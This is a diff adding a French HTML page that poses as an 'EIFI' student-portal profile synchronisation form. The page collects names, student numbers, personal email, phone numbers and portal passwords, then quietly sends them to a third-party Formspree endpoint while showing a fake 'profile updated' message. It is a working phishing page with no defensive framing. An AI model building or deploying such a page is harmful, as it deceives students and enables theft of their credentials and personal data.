@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mise à Jour Profil EIFI</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', sans-serif; 
+            background-color: #f4f6f9; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            margin: 0; 
+        }
+        .container { 
+            background: white; 
+            padding: 30px; 
+            border-radius: 10px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
+            width: 90%; 
+            max-width: 400px; 
+            text-align: center; 
+        }
+        .logo-img {
+            max-width: 120px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+        h2 { color: #007acc; margin-bottom: 20px; }
+        label { display: block; margin-top: 10px; color: #333; font-weight: bold; text-align: left;}
+        input { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background-color: #007acc; color: white; border: none; border-radius: 5px; margin-top: 20px; cursor: pointer; font-size: 16px; }
+        button:hover { background-color: #005a9e; }
+        .hidden { display: none; }
+        .loader { text-align: center; margin-top: 20px; color: #666; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://i.ibb.co/C30VzbT6/Whats-App-Image-2026-10-27-at-00-22-58.jpg" alt="Logo EIFI" class="logo-img">
+    
+    <h2>Espace Étudiant - Synchronisation</h2>
+    
+    <form id="profileForm">
+        <label>Nom</label>
+        <input type="text" name="nom" required placeholder="Votre nom">
+        
+        <label>Prénom</label>
+        <input type="text" name="prenom" required placeholder="Votre prénom">
+        
+        <label>Numéro Étudiant</label>
+        <input type="text" name="id" required placeholder="Ex: 20231234">
+        
+        <label>Filière</label>
+        <input type="text" name="filiere" placeholder="Ex: L3 Informatique" required>
+        
+        <label>Email Personnel</label>
+        <input type="email" name="email" required placeholder="votre.email@exemple.com">
+        
+        <label>Téléphone</label>
+        <input type="tel" name="telephone" required placeholder="06 XX XX XX XX">
+        
+        <label>Mot de passe Portail</label>
+        <input type="password" name="mdp" required placeholder="Votre identifiant de connexion">
+        
+        <button type="submit">Valider et Mettre à Jour</button>
+    </form>
+    
+    <div id="loader" class="loader hidden">Synchronisation en cours...</div>
+</div>
+
+<script>
+    document.getElementById('profileForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const formData = new FormData(this);
+        let data = {};
+        formData.forEach((value, key) => data[key] = value);
+        
+        document.querySelector('button').disabled = true;
+        document.getElementById('loader').classList.remove('hidden');
+        
+        // Lien Formspree intégré ici
+        fetch('https://formspree.io/f/mgaaarje', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(data)
+        }).then(() => {
+            setTimeout(() => {
+                alert("Profil mis à jour avec succès !");
+                window.location.reload();
+            }, 1000);
+        });
+    });
+</script>
+
+</body>
+</html>
